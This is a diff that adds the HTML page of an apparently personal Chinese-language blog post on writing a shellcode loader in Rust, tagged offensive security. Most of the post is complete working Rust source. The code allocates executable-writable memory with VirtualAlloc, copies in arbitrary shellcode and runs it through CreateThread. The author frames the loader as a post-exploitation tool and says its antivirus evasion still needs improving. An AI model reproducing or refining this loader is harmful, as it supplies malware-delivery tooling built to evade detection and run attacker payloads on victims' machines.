@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noodp"/>
+    <meta name="author" content="Fumerem">
+    <meta name="description" content="fumerem 的个人博客">
+    
+    
+    <link rel="prev" href="https://fumerem.github.io/2022/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/" />
+    <link rel="next" href="https://fumerem.github.io/2022/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" />
+    <link rel="canonical" href="https://fumerem.github.io/2022/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <title>
+        
+        
+            rust编写shellcode加载器 | Fumerem&#39;s Blog
+        
+    </title>
+    <meta name="title" content="rust编写shellcode加载器 | Fumerem&#39;s Blog">
+    
+<link rel="stylesheet" href="/css/main.min.css">
+
+
+    
+    
+ 
+
+<script type="application/ld+json">
+{
+    "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/fumerem.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "rust编写shellcode加载器",
+    "headline" : "rust编写shellcode加载器",
+    "description" : "​ 突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码. 项目地址:https:\/\/github.com\/fume",
+    "inLanguage" : "en",
+    "author" : "Fumerem",
+    "creator" : "Fumerem",
+    "publisher": "Fumerem",
+    "accountablePerson" : "Fumerem",
+    "copyrightHolder" : "Fumerem",
+    "copyrightYear" : "2022",
+    "datePublished": "2022-06-12 17:15:54 \u002b0800 CST",
+    "dateModified" : "2022-06-12 17:15:54 \u002b0800 CST",
+    "url" : "https:\/\/fumerem.github.io\/2022\/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8\/",
+    "wordCount" : "898",
+    "keywords" : [ "rust","offensive_security", "Fumerem\u0027s Blog"]
+}
+</script>
+
+  </head>
+    <body class="">
+        <div class="wrapper">
+            <nav class="navbar">
+    
+        <progress class="content_progress" max="0" value="0"></progress>
+    
+    <div class="container">
+        
+            <div class="navbar-header header-back2home-logo">
+                <span class="logo_mark" >>$</span>
+                <a href="https://fumerem.github.io">
+                    <span class="logo_text" >cd ~</span>
+                    <span class="logo_cursor" ></span>
+                </a>
+            </div>
+        
+        <div class="navbar-right">
+                
+                <span class="menu">
+                
+                <a class="menu-item" href="/posts/" title="">Posts</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <span class="divide"></span>
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-dark-mode"></i></a>
+                </span>
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+    
+        <progress class="content_progress" max="0" value="0"></progress>
+    
+     <div class="container">
+        <div class="navbar">
+            <div class="navbar-header header-logo">
+                    <a href="https://fumerem.github.io">Fumerem&#39;s Blog</a>
+            </div>
+            <div class="navbar-right">
+                <div><a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-dark-mode"></i></a></div>
+                <div class="menu-toggle">
+                    <span></span><span></span><span></span>
+                </div>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                <nav class="mb-md">
+                    
+                    
+                        <a class="menu-item" href="/posts/" title="">
+                            <h3>Posts</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/categories/" title="">
+                            <h3>Categories</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/tags/" title="">
+                            <h3>Tags</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                        <a class="menu-item" href="/about/" title="">
+                            <h3>About</h3>
+                            <div class="menu-active"></div>
+                        </a>
+                    
+                </nav>
+        </div>
+    </div>
+</nav>
+            <main class="main">
+                <div class="container">
+                    
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">rust编写shellcode加载器</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://fumerem.github.io" rel="author">Fumerem</a> with ♥
+                <span class="post-time">
+                on <time datetime=2022-06-12 itemprop="datePublished">June 12, 2022</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        
+                        
+                        
+                          <a href="https://fumerem.github.io/categories/programming/"> programming, </a>
+                        
+                        
+                </span>
+                <span class="post-word-count">898 words</span>
+        </div>
+    </header>
+
+    <div class="post-content">
+        
+
+        
+        
+
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        <p>​	突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码.</p>
+<p>项目地址:https://github.com/fumerem/shellcode_loader</p>
+<h2 id="0x00-shellcode加载器原理">0x00 shellcode加载器原理</h2>
+<p>shellcode:一段16进制的机器码,后渗透中经常使用它来得到shell而得名.</p>
+<p>加载器原理:为shellcode分配动态内存,并创建进程执行shellcode</p>
+<h2 id="0x01-加载器的编写">0x01 加载器的编写</h2>
+<p>先列举一下加载器需要调用的windows的api</p>
+<h3 id="vistualalloc">VistualAlloc</h3>
+<blockquote>
+<p>申请内存</p>
+<p>LPVOID VirtualAlloc {
+LPVOID lpAddress, #要分配的内存区域的地址
+DWORD dwSize,      #分配的大小
+DWORD flAllocationType, #分配的类型
+DWORD flProtect     #该内存的初始保护属性
+};</p>
+</blockquote>
+<p>代码实现</p>
+<pre tabindex="0"><code>unsafe {
+	memory.ptr = Memory::VirtualAlloc(
+		ptr::null(),
+		//memory address to distribute
+		len,
+		//memory size
+		Memory::MEM_COMMIT | Memory::MEM_RESERVE,
+		//alloc type
+		Memory::PAGE_EXECUTE_READWRITE,
+		//protect attribute
+	) as *mut u8;
+};
+</code></pre><h3 id="createthread">CreateThread</h3>
+<blockquote>
+<p>创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread</p>
+<p>HANDLE CreateThread (
+LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
+SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位
+LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
+LPVOID lpParameter,          #向线程函数传递的参数
+DWORD dwCreationFlags,       #线程创建属性
+LPDWORD lpThreadId           #保存新线程的id
+)</p>
+</blockquote>
+<p>代码实现</p>
+<pre tabindex="0"><code>th.handle = Threading::CreateThread(
+	ptr::null_mut(),
+	//thread protect attribute
+	0,
+	//stack attribute
+	Some(ep),
+	//pointer to thread func
+	ptr::null_mut(),
+	//prama to thread func
+	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
+	//thread create flags
+	&amp;mut th.tid,
+	//thread id
+).unwrap();
+</code></pre><h3 id="virtualfree">VirtualFree</h3>
+<pre tabindex="0"><code>VirtualFreeEx{编辑 播报
+	HANDLE hProcess, // 要释放内存所在进程的句柄
+	LPVOID lpAddress, // 区域地址
+	DWORD dwSize, // 区域大小，字节
+	DWORD dwFreeType //类型
+};
+</code></pre><p>代码实现</p>
+<pre tabindex="0"><code>Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
+</code></pre><p>lib.rs全部代码</p>
+<pre tabindex="0"><code>use std::ptr;
+use std::slice;
+use std::mem;
+use std::ffi::c_void;
+use windows::Win32::System::Memory;
+use windows::Win32::Foundation;
+use windows::Win32::Foundation::WIN32_ERROR;
+use windows::Win32::System::Threading;
+use windows::Win32::System::WindowsProgramming;
+
+pub struct DistributeMemory {
+	len: usize,
+	ptr: *mut u8,
+}
+
+impl Drop for DistributeMemory {
+	fn drop(&amp;mut self) {
+		unsafe{
+			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
+		}
+	}
+}
+
+impl DistributeMemory {
+	fn new(len: usize) -&gt; Result&lt;DistributeMemory, WIN32_ERROR&gt; {
+		let mut memory = DistributeMemory {
+			len,
+			ptr: ptr::null_mut(),
+		};
+		
+		unsafe {
+			memory.ptr = Memory::VirtualAlloc(
+				ptr::null(),
+				//memory address to distribute
+				len,
+				//memory size
+				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
+				//alloc type
+				Memory::PAGE_EXECUTE_READWRITE,
+				//protect attribute
+			) as *mut u8;
+		};
+		
+		if memory.ptr.is_null() {
+			Err( unsafe{ Foundation::GetLastError()} )
+		} else {
+			Ok(memory)
+		}
+	}
+	
+	pub fn as_slice_mut(&amp;mut self) -&gt; &amp;mut[u8] {
+		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
+	}
+	
+	pub fn as_ptr(&amp;self) -&gt; *mut u8 {
+		self.ptr
+	}
+}
+
+pub struct Thread {
+	handle: Foundation::HANDLE,
+	tid: u32,
+}
+
+impl Drop for Thread {
+	fn drop(&amp;mut self) {
+		unsafe { Foundation::CloseHandle(self.handle) };
+	}
+}
+
+impl Thread {
+	pub unsafe fn run(start: *const u8) -&gt; Result&lt;Thread, WIN32_ERROR&gt; {
+		let mut th = Thread {
+			handle: Foundation::HANDLE(0),
+			tid: 0,
+		};
+		
+		let ep: extern &#34;system&#34; fn(*mut c_void) -&gt; u32 = { std::mem::transmute(start) };
+		
+		th.handle = Threading::CreateThread(
+			ptr::null_mut(),
+			//thread protect attribute
+			0,
+			//stack attribute
+			Some(ep),
+			//pointer to thread func
+			ptr::null_mut(),
+			//prama to thread func
+			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
+			//thread create flags
+			&amp;mut th.tid,
+			//thread id
+		).unwrap();
+		
+		if th.handle == Foundation::HANDLE(0) {
+			Err(Foundation::GetLastError())
+		} else {
+			Ok(th)
+		}
+	}
+	
+	pub fn wait(&amp;self) -&gt; Result&lt;(), WIN32_ERROR&gt; {
+		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
+		if status == 0 {
+			Ok(())
+		} else {
+			Err( unsafe{Foundation::GetLastError()} )
+		}
+	}
+}
+
+pub fn run(shellcode: Vec&lt;u8&gt;) -&gt; Result&lt;(), WIN32_ERROR&gt; {
+	let mut me = DistributeMemory::new(shellcode.len())?;
+	let ms = me.as_slice_mut();
+	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
+	let t = unsafe {
+		Thread::run(me.as_ptr())
+	}?;
+	t.wait()
+}
+</code></pre><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
+<p>​	由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量.</p>
+<p>免杀功能仍须改进</p>
+
+    </div>
+
+    <div class="post-copyright">
+            
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Fumerem </span>
+                </p>
+            
+
+            
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://fumerem.github.io/2022/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/>https://fumerem.github.io/2022/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</span>
+            </p>
+            
+            
+            <p class="copyright-item lincese">
+                This article is licensed under the <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">creative commons attribution 4.0 international license</a>.
+            </p>
+            
+    </div>
+
+
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s):
+            
+            <span class="tag"><a href="https://fumerem.github.io/tags/rust/">
+                    #rust</a></span>
+            
+            <span class="tag"><a href="https://fumerem.github.io/tags/offensive_security/">
+                    #offensive_security</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> ·
+                <span><a href="https://fumerem.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://fumerem.github.io/2022/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/" class="prev" rel="prev" title="从底层了解rust的所有权机制"><i class="iconfont icon-left"></i>&nbsp;从底层了解rust的所有权机制</a>
+        
+        
+        <a href="https://fumerem.github.io/2022/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" class="next" rel="next" title="列举常见linux提权方式">列举常见linux提权方式&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+        
+            
+        
+    </div>
+</article>
+                </div>
+            </main>
+            <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2021 - 2022</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i>
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://fumerem.github.io">Fumerem</a> | </span>
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/wujunze/hugo-theme-geek" target="_blank" rel="external nofollow">Hugo-theme-geek</a></span>
+    </div>
+</footer>
+
+
+
+
+
+<script src="/js/vendor_main.min.js" defer ></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
+<script> pangu.spacingPage();</script>
+
+
+
+        </div>
+    </body>
+</html>
